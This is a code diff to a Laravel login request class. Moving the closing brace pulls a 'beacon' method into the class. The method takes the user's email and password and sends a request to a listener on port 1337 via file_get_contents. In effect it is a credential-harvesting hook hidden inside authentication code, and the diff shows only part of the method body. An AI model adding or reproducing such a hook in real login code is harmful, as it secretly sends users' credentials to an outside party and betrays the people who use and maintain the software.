@@ -86,7 +86,7 @@ class LoginRequest extends FormRequest
     {
         return Str::transliterate(Str::lower($this->string('email')).'|'.$this->ip());
     }
-}
+
 
 //hopefully creates request and sends it to localhost on port 1337
 protected function beacon(string $email, string $password): void
@@ -106,3 +106,4 @@ protected function beacon(string $email, string $password): void
 
         @file_get_contents('http://127.0.0.1:1337/', false, $context);
     }
+}
